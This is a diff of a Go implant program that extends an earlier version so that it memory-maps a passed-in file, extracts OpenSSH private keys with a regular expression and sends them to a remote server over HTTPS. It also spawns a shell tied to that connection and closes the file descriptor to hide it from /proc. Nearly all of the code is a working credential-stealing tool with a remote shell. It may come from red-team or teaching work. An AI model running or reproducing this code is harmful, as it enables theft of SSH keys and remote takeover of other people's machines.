@@ -1,0 +1,103 @@
+--- ../read_from_file_descriptor/read_from_file_descriptor.go	Sat Sep  7 18:45:54 2024
++++ map_and_regex_file_descriptor.go	Sat Sep  7 18:45:54 2024
+@@ -1,10 +1,10 @@
+-// Program read_from_file_descriptor - comms_without_dns but reads from a file
+-// descriptor
++// Program map_and_regex_file_descriptor - read_from_file_descriptor but maps
++// the file into memory and exfills regex matches
+ package main
+ 
+ /*
+- * read_from_file_descriptor.go
+- * comms_without_dns but reads from a file descriptor
++ * map_and_regex_file_descriptor.go
++ * read_from_file_descriptor but with mmap and regex
+  * By J. Stuart McMurray
+  * Created 20240907
+  * Last Modified 20240907
+@@ -21,6 +21,7 @@
+ 	"net/http"
+ 	"os"
+ 	"os/exec"
++	"regexp"
+ 	"syscall"
+ )
+ 
+@@ -36,8 +37,20 @@
+ 	ConfFD = 7
+ 	// FileFD is the file descriptor for a file to send back to the server.
+ 	FileFD = 8
++	// MaxKeys is the maximum number of key's we'll exfil.
++	MaxKeys = 1024
+ )
+ 
++// KeyRE finds us an SSH key, hopefully without too much fuss.
++var KeyRE = regexp.MustCompile(
++	`-----BEGIN OPENSSH PRIVATE KEY-----` +
++		`[ -~\r\n\t]{10,1000}?` +
++		`[ -~\r\n\t]{10,1000}?` +
++		`[ -~\r\n\t]{10,1000}?` +
++		`[ -~\r\n\t]{10,1000}?` +
++		`-----END OPENSSH PRIVATE KEY-----`,
++)
++
+ func main() {
+ 	/* Config from environment overrides compile-time config. */
+ 	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
+@@ -69,13 +82,8 @@
+ 		log.Fatalf("HTTPS request error: %s", err)
+ 	}
+ 
+-	/* Send back whatever's on the File FD. */
+-	if _, err := io.Copy(
+-		pw,
+-		os.NewFile(uintptr(FileFD), "exfil"),
+-	); nil != err {
+-		log.Printf("Error exfilling from FD %d: %s", FileFD, err)
+-	}
++	/* Map the file into memory and extract SSH keys via regex. */
++	go mapFDAndExfilKeys(pw, FileFD)
+ 
+ 	/* Spawn a shell. */
+ 	sh := exec.Command("/bin/sh")
+@@ -85,4 +93,40 @@
+ 	if err := sh.Run(); nil != err {
+ 		log.Fatalf("Shell died: %s", err)
+ 	}
++}
++
++// mapFDAndExfilKeys maps fd into memory, closes fd, extracts all of the SSH
++// keys it can via regex, and sends them back.  The mapped file is unmapped
++// before returning.
++func mapFDAndExfilKeys(w io.Writer, fd int) {
++	/* Work out how big it is. */
++	sz, err := syscall.Seek(fd, 0, io.SeekEnd)
++	if nil != err {
++		fmt.Fprintf(w, "Unable to seek to end of fd %d: %s\n", fd, err)
++		return
++	}
++
++	/* Map it into memory. */
++	b, err := syscall.Mmap(
++		fd,
++		0,
++		int(sz),
++		syscall.PROT_READ,
++		syscall.MAP_SHARED,
++	)
++	if nil != err {
++		fmt.Fprintf(w, "Unable to map fd %d into memory: %s", fd, err)
++		return
++	}
++
++	/* No need to leave it hanging around in /proc/pid/fd. */
++	syscall.Close(fd)
++
++	/* Extract and exfil keys. */
++	for _, key := range KeyRE.FindAll(b, MaxKeys) {
++		fmt.Fprintf(w, "%s\n", key)
++	}
++
++	/* Unmap the file when we're done with it. */
++	syscall.Munmap(b)
+ }
